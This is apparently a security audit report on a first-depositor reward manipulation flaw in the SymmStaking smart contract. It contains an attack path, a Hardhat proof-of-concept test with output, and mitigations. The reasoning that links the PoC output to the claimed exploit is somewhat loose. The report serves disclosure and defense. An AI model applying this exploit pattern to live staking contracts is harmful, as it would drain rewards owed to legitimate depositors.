# Reward Calculation Manipulation via Initial Tiny Deposit

### Summary

The SymmStaking contract's reward calculation mechanism is vulnerable to manipulation when an attacker makes an initial tiny deposit followed by a large deposit. This exploit allows the attacker to claim disproportionately high rewards due to an incorrect order of state updates in the `deposit` function.

### Root Cause

The vulnerability exists in the interaction between [`rewardPerToken()`](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L194-L202) and [`earned()`](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L210-L214) calculations when transitioning from `totalSupply = 0` to a very small, non-zero totalSupply. When a user makes the first deposit with a minimal amount, the reward rate remains constant but is distributed to an extremely small supply, resulting in disproportionately high rewardPerToken values.

### Internal Pre-conditions

none

### External Pre-conditions

none

### Attack Path

1. Attacker observes a new staking pool or notices rewards have been added to a pool with `totalSupply = 0`
2. Attacker makes a minimal first deposit (e.g., 0.0001 tokens)
3. System starts distributing rewards with the attacker receiving 100% of them
4. When legitimate users deposit significant amounts later, the high `rewardPerToken` value has already been recorded
5. Attacker claims an extremely disproportionate amount of rewards compared to their stake

### Impact

The attacker can drain a significant portion of rewards intended for the pool participants while contributing minimally to the pool.

### PoC

```javascript
it("First depositor attack demonstration", async function () {
    // Admin adds rewards to the pool
    const rewardAmount = "604800"
    await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
    await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)
    await symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])
    
    // Test Case 1: Attacker deposits minimal amount first
    const smallDeposit = e("0.0001") // 0.0001 SYMM tokens
    await stakingToken.connect(user1).approve(await symmStaking.getAddress(), smallDeposit)
    await symmStaking.connect(user1).deposit(smallDeposit, user1.address)
    
    const perTokenStoredAfterSmallDeposit = await (await symmStaking.rewardState(usdtToken.getAddress())).perTokenStored
    console.log("perTokenStored after small deposit:", perTokenStoredAfterSmallDeposit);
    
    // Another user deposits a large amount
    await stakingToken.connect(user2).approve(await symmStaking.getAddress(), e("100"))
    await symmStaking.connect(user2).deposit(e("100"), user2.address)
    
    const perTokenStoredAfterLargeDeposit = await (await symmStaking.rewardState(usdtToken.getAddress())).perTokenStored
    console.log("perTokenStored after large deposit:", perTokenStoredAfterLargeDeposit);
    
    // The value of perTokenStored is very high (20000 in test), giving attacker disproportionate rewards
})
```
Results:

`
perTokenStored after small deposit: 0n
perTokenStored after large deposit: 20000n
`

When changing the first deposit to 1 SYMM token instead of 0.0001:

`
perTokenStored after small deposit: 0n
perTokenStored after large deposit: 2n
`

This demonstrates that small initial deposits lead to manipulated reward calculations.

### Mitigation

1. **Initial Deposit:** Deploy the contract with a minimum initial stake by a trusted party to prevent totalSupply from being zero or very small.
2. **Minimum Deposit Threshold:** Implement a minimum deposit requirement that is sufficiently large to prevent these attacks.
3. **Reward Cap:** Add a maximum cap on rewardPerToken increases to limit the impact of manipulated ratios.
4. **Balance-Weighted First Period:** Make the first reward period after totalSupply becomes non-zero distribute rewards based on relative balance weight over time rather than using the standard formula.
